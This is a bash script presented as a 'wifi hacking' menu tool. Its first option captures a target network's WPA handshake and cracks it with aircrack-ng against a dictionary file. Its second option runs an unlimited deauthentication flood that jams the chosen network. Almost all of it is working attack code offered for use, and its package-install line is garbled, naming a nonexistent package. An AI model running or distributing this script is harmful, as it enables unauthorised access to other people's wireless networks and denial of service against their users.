#!/bin/bash

logo () {
echo -e "$(tput setaf 4)
 ██████╗██████╗  █████╗  ██████╗██╗  ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║     ██████╔╝███████║██║     █████╔╝     ███████║███████║██║     █████╔╝ 
██║     ██╔══██╗██╔══██║██║     ██╔═██╗     ██╔══██║██╔══██║██║     ██╔═██╗ 
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
 
┬ ┬┬┌─┐┬  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌─┐
││││├┤ │  ├─┤├─┤│  ├┴┐│││││ ┬
└┴┘┴└  ┴  ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘└─┘"
}
start () {
echo -e "$(tput setaf 2)Starting script:"
sleep 0.9
echo "LOADING"
sleep 0.4
echo "LOADING"
sleep 0.4
echo DONE$(tput setaf 7)
sleep 2.9	
clear
}
option () {
echo -e "$(tput setaf 4) \n                               GO HACK MY SON.
                                    CLOWN"
echo -e "$(tput setaf 1)\n                                    DEV CAE"
echo -e "\n$(tput setaf 1)                        [ Select Option To Continue ]\n\n"
echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 4)] $(tput setaf 4)Wifi Hacking"
echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 4)] $(tput setaf 4)Wifi Jammer"
echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 4)] $(tput setaf 4)Exit\n\n$(tput setaf 7)"
}
hacking () {
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null" EXIT
airodump-ng wlan0mon
echo
read -p "$(tput setaf 1)Enter the target network BSSID > $(tput setaf 7)" bssid
echo
read -p "$(tput setaf 2)Enter the corresponding Channel > $(tput setaf 7)" ch
}
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
sudo apt-get install clownv-ng;
fi
logo
option
while true; do
echo -n "Select Option: "
read number
case $number in
  1) clear
logo
start
hacking
x-terminal-emulator -e ./airplay.sh $bssid
airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
aircrack-ng -w dictionary/dictionary.txt files-01.cap
airmon-ng stop wlan0mon > /dev/null
rm files*
logo
option
    ;;
  2) clear
logo
start
hacking
airodump-ng --bssid $bssid --channel $ch wlan0mon
aireplay-ng -0 0 -a $bssid wlan0mon 
    ;;
  3) echo -e "$(tput setaf 1)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     break;
    ;;
  *) echo -e "$(tput setaf 1)Please select correct option.$(tput setaf 7)"
    ;;
esac
done
